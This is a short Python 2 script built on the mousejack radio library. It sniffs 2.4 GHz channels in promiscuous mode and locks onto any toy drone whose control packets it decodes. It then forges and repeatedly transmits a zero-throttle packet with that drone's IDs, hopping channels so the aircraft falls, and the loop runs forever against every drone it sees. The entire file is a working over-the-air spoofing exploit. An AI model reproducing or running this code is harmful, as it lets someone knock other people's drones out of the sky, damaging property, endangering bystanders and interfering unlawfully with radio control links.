#!/usr/bin/env python2
import logging, os, sys, time

scriptdir = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(scriptdir, 'mousejack/tools'))

from lib import common
from droneduel import *

def rain_from_the_sky():
    # this packet cuts throttle to a drone, cid and vid will be filled out later
    rain_packet = drone_packet(0x55, 0, 0, throttle=969)

    # loop through all the channels in the first channel block
    for ch in xrange(3,19):
        common.radio.set_channel(ch)
        t0 = time.time()
        print 'ch', ch

        channel_dwell_time = 0.1
        while time.time()-t0<channel_dwell_time:
            # Receive and parse a packet
            payload = common.radio.receive_payload()
            if len(payload) > 1:
                crc_success, pkt = parse_packet(payload.tostring())
                if crc_success:
                    # fill out rain_packet for this target
                    rain_packet.cid = pkt.cid
                    rain_packet.vid = pkt.vid
                    pkt_out = rain_packet.to_bytes()
                    print 'lock', map(hex, pkt.cid), map(hex, pkt.vid)

                    # hop along the channels and transmit rain_packet with half
                    # duty cycle and each channel (3 milliseconds of 6)
                    drop_time = 2.0
                    channel_index = 0
                    hop_channels = pkt.calc_channels()
                    common.radio.set_channel(hop_channels[channel_index])
                    while time.time()-t0<drop_time:
                        t1 = time.time()
                        while time.time()-t1<3e-3:
                            common.radio.transmit_payload_generic(pkt_out, address='\xFF\xFF\xFF\xFF\xFF')
                        channel_index += 1
                        channel_index %= 4
                        common.radio.set_channel(hop_channels[channel_index])
                    print 'lock done.', map(hex, pkt.cid), map(hex, pkt.vid)
                else:
                    print 'bad crc', pkt.cid, pkt.vid


# Init command line args
common.init_args('./rain-from-the-sky.py')
common.parse_and_init()

# Put the radio in promiscuous mode (generic)
common.radio.enter_promiscuous_mode_generic('\x71\x0F\x55', common.RF_RATE_1M)

# Tune to 2402 MHz 
common.radio.set_channel(2)

while True:
    # loop through all the channels in the first block and drop everything seen
    rain_from_the_sky()